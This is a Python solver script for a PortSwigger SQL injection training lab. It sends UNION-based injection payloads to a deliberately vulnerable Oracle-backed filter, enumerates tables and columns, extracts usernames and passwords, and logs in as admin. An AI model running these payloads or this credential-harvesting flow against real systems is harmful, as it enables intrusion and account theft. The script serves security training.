import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
# db: OracleDB
# author: 0xyf


class SQLi6:
    def __init__(self):
        self.lab_id = "0ace0080031cd2bc80151785006d009f"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.get_csrf_token()

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        params = {"category": payload}
        r = requests.get(
            f"{self.vuln_url}", params=params, proxies=self.proxies, verify=False
        )
        return r

    def get_tables(self):
        payload = "'UNION SELECT table_name,'9935' FROM all_tables-- -"
        r = self.execute_request(payload)
        tables = self.parse(r)

        a = [x for x in tables if "USERS_" in x]  # tables with the word 'user' in them
        self.table = a[-1]  # index -1 is the custom user table created for the lab
        print(f"[*] user table: {self.table}")

    def get_columns(self):
        payload = f"'UNION SELECT column_name,'3670' FROM all_tab_columns where table_name='{self.table}'-- -"
        r = self.execute_request(payload)
        self.columns = self.parse(r)
        self.email, self.password_col, self.username_col = self.columns
        print(f"[*] columns: {self.columns}")

    def get_usernames(self):
        payload = f"'UNION SELECT {self.username_col},'3670' FROM {self.table}-- - "
        r = self.execute_request(payload)
        usernames = self.parse(r)
        self.username = [x for x in usernames if "admin" in x][0]
        print(f"[*] usernames: {usernames}")

    def get_passwords(self):
        payload = f"'UNION SELECT {self.password_col},'3670' FROM {self.table}-- - "
        r = self.execute_request(payload)
        self.passwords = self.parse(r)
        print(f"[*] passwords: {self.passwords}")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def login(self):
        for password in self.passwords:
            print(f"[*] Attempting to Login as {self.username}:{password}")
            data = {
                "username": self.username,
                "password": password,
                "csrf": self.csrf_token,
            }
            r = requests.post(
                self.login_url,
                cookies=self.cookies,
                data=data,
                proxies=self.proxies,
                verify=False,
            )
            if r.status_code == 200:
                if "Invalid username or password." in r.text:
                    pass
                else:
                    print(f"[*] valid combination {self.username}:{password}")

    def solve(self):
        self.get_tables()
        self.get_columns()
        self.get_usernames()
        self.get_passwords()
        self.login()
        self.check_solved()

    @staticmethod
    def parse(r):
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table")
        headers = [header.text.strip() for header in table.find_all("th")]
        return headers


def main():
    SQLi6().solve()


if __name__ == "__main__":
    main()
